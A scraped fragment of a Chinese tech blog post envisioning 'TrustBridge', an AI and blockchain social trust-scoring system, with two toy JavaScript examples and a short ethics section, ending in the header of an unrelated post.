20px;background-image:url("data:image/png;base64,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")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,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");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"❝";top:8px;left:5px}.markdown-body blockquote:after{content:"❞";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🌍 一、前言：信任危机与数字孤岛</h2>
<p>我们生活在一个 <strong>前所未有的数据丰盈时代</strong>。<br/>
信息爆炸让我们能认识全世界的人，却越来越难判断谁值得信任。</p>
<blockquote>
<p>朋友圈的笑脸背后可能是滤镜，<br/>
匿名评论区的赞美可能是机器人。</p>
</blockquote>
<p>于是，“信任”成了未来社交系统中<strong>最稀缺、也最珍贵的资源</strong>。</p>
<p>如果 AI 能成为构建人际信任的“数字桥梁”呢？<br/>
我们或许能打造出一个全新的生态：<br/>
让诚实的人被算法放大，让真实的连接重现温度。</p>
<hr/>
<h2 data-id="heading-1">🧭 二、AI 在“信任系统”中的角色定位</h2>
<p>AI 在构建信任的过程中，不是裁判，而是<strong>信号放大器</strong>。<br/>
它的使命，不是代替人判断，而是用科学的方式捕捉 “行为中的诚意”。</p>
<h3 data-id="heading-2">🧠 分三层结构理解 AI 信任系统：</h3>





























<table><thead><tr><th>层级</th><th>名称</th><th>功能</th><th>示例/比喻</th></tr></thead><tbody><tr><td>🌾 感知层</td><td>数据采集</td><td>识别语言、表情、行为等社交信号</td><td>看一个人“眼神是否真诚”</td></tr><tr><td>🏗️ 理解层</td><td>AI 判断模型</td><td>用 NLP、情绪识别、社交模式分析来推导信任倾向</td><td>心理学家的大脑</td></tr><tr><td>🕊️ 共识层</td><td>区块链或可信平台</td><td>将信任关系固化、公开、可追溯</td><td>法律公证人</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-3">🧩 三、未来软件的蓝图：Project “TrustBridge”</h2>
<p>假设我们设计一款未来社交软件：<strong>TrustBridge（信任之桥）</strong> 。<br/>
目标是帮助社群、企业、小众群体，通过 <strong>AI + Web3 信任协议</strong> 构建真实社交资本。</p>
<hr/>
<h3 data-id="heading-4">🌐 软件核心架构：</h3>
<pre><code class="hljs">用户行为 → AI 分析模型 → 信任指数生成 → 链上存储 → 社会共识层展示
</code></pre>
<hr/>
<h3 data-id="heading-5">🚀 关键模块</h3>



































<table><thead><tr><th>模块</th><th>技术基础</th><th>功能描述</th></tr></thead><tbody><tr><td><strong>AI 信任引擎</strong></td><td>大语言模型 + 情感识别网络</td><td>解析文字、语气、行为特征，生成个体信任向量</td></tr><tr><td><strong>行为图谱（Trust Graph）</strong></td><td>图数据库 + 社交网络分析</td><td>探索人与人之间的信任关系路径</td></tr><tr><td><strong>分布式信誉账本（TrustChain）</strong></td><td>区块链 / DAG 架构</td><td>确保信誉可验证但不被伪造</td></tr><tr><td><strong>数字人格系统（AI Persona）</strong></td><td>自监督学习 + 强化学习</td><td>让每个用户有一个“AI 影子”，随时间演化其信任画像</td></tr><tr><td><strong>社群治理协议（DAO）</strong></td><td>智能合约</td><td>群体基于 AI 提供的信任评分进行决策投票</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-6">💬 简单 JS 模拟：信任图谱系统原型</h3>
<p>下面的例子用 JavaScript 模拟了一个“信任推荐”逻辑：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TrustBridge</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">graph</span> = {};
  }

  <span class="hljs-title function_">connect</span>(<span class="hljs-params">a, b, score</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">graph</span>[a]) <span class="hljs-variable language_">this</span>.<span class="hljs-property">graph</span>[a] = {};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">graph</span>[a][b] = score;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`🧩 <span class="hljs-subst">${a}</span> 对 <span class="hljs-subst">${b}</span> 的信任值设为 <span class="hljs-subst">${score}</span>`</span>);
  }

  <span class="hljs-title function_">recommend</span>(<span class="hljs-params">a</span>) {
    <span class="hljs-keyword">const</span> connections = <span class="hljs-variable language_">this</span>.<span class="hljs-property">graph</span>[a] || {};
    <span class="hljs-keyword">const</span> suggestions = [];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> [person, score] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(connections)) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> [friend, friendScore] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">graph</span>[person] || {})) {
        <span class="hljs-keyword">if</span> (!connections[friend]) {
          suggestions.<span class="hljs-title function_">push</span>({ friend, <span class="hljs-attr">potential</span>: (score + friendScore) / <span class="hljs-number">2</span> });
        }
      }
    }
    <span class="hljs-keyword">return</span> suggestions.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> b.<span class="hljs-property">potential</span> - a.<span class="hljs-property">potential</span>);
  }
}

<span class="hljs-keyword">const</span> system = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TrustBridge</span>();
system.<span class="hljs-title function_">connect</span>(<span class="hljs-string">"Alice"</span>, <span class="hljs-string">"Bob"</span>, <span class="hljs-number">0.9</span>);
system.<span class="hljs-title function_">connect</span>(<span class="hljs-string">"Bob"</span>, <span class="hljs-string">"Charlie"</span>, <span class="hljs-number">0.7</span>);
system.<span class="hljs-title function_">connect</span>(<span class="hljs-string">"Bob"</span>, <span class="hljs-string">"Diana"</span>, <span class="hljs-number">0.8</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"🔮 信任推荐结果:"</span>, system.<span class="hljs-title function_">recommend</span>(<span class="hljs-string">"Alice"</span>));
</code></pre>
<p>✨ 输出结果：系统会猜测 Alice 可能信任 Bob 的朋友 Charlie 和 Diana，并给出预测强度。<br/>
也就是“社交信任扩散”的简易算法雏形。</p>
<hr/>
<h2 data-id="heading-7">🧠 四、AI 的深度角色：读懂“行为中的信任”</h2>
<h3 data-id="heading-8">1. 自然语言信任建模</h3>
<p>AI 能理解一个人的话语模式，提取出“真诚指数”。<br/>
例如：</p>
<ul>
<li>主观性强的语句（如“我很确定”）→ 稍降低信任。</li>
<li>带有证据的表达（如“根据数据…”）→ 提升信任。</li>
</ul>
<p>AI 将用这些微特征，生成<strong>个人信任画像向量</strong>。</p>
<h3 data-id="heading-9">2. 行为模式预测</h3>
<p>通过长期学习用户互动，AI 可识别异常行为：</p>
<ul>
<li>突然大量添加好友？🤖</li>
<li>频繁正面但无细节的留言？可能是“情感农场”行为。</li>
</ul>
<p>这些特征被模型量化成信任度曲线，供社群参考。</p>
<hr/>
<h2 data-id="heading-10">🏗️ 五、信任的社会层实现：智能信任合约</h2>
<p>想象一下，当一个社群项目启动资金众筹时，<br/>
AI 会根据参与者历史信誉、项目透明度、交流频率等指标生成一个<strong>群体信任指数</strong>。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">TrustContract</span> = {
  <span class="hljs-attr">threshold</span>: <span class="hljs-number">0.8</span>,
  <span class="hljs-title function_">verify</span>(<span class="hljs-params">projectTrust, userTrust</span>) {
    <span class="hljs-keyword">return</span> (projectTrust + userTrust) / <span class="hljs-number">2</span> &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">threshold</span>;
  },
};

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"💡投资可行性："</span>, <span class="hljs-title class_">TrustContract</span>.<span class="hljs-title function_">verify</span>(<span class="hljs-number">0.9</span>, <span class="hljs-number">0.85</span>));
</code></pre>
<p>这样的智能合约会自动决定：<br/>
资金是否解锁、决策是否通过、关系是否继续。</p>
<blockquote>
<p>社会契约 + 智能算法 = 自演化的信任文明。</p>
</blockquote>
<hr/>
<h2 data-id="heading-11">🌱 六、伦理与人文的最后屏障</h2>
<p>当信任被编码，我们必须设立边界。</p>
<ul>
<li>AI 不应定义“好人”与“坏人”，只能辅助判断“可信行为”。</li>
<li>所有信任数据都应可撤回、可匿名。</li>
<li>系统需内置“赎回机制”：信任不是永久标签，而是动态流动的信用生态。</li>
</ul>
<blockquote>
<p>因为人类之所以成为人类，<br/>
恰恰在于可以被重新信任一次。 💫</p>
</blockquote>
<hr/>
<h2 data-id="heading-12">🪙 七、结语：从服务器到灵魂的桥梁</h2>
<p>结合 AI 的信任系统，不只是技术创新，<br/>
它更像是文明的一次“重启”：</p>
<ul>
<li>我们不再盲目点赞，而是彼此赋能。</li>
<li>我们不再凭“热度”判断真伪，而凭行为的长期一致性。</li>
<li>我们不再构建“粉丝圈”，而是重建“信任圈”。</li>
</ul>
<p>最终的愿景是：</p>
<blockquote>
<p><strong>让每一次善意，都有回响。</strong><br/>
<strong>让每一次信任，都被计算、被珍视、被永存。</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vibe Coding 提示词优化的四个实战策略]]></title>    <link>https://juejin.cn/post/7594093947809349666</link>    <guid>https://juejin.cn/post/7594093947809349666</guid>    <pubDate>2026-01-12T12:54:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594093947809349666" data-draft-id="7594093947809333282" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vibe Coding 提示词优化的四个实战策略"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-12T12:54:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="A小码哥"/> <meta itemprop="url" content="https://juejin.cn/user/4248168660742797"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vibe Coding 提示词优化的四个实战策略
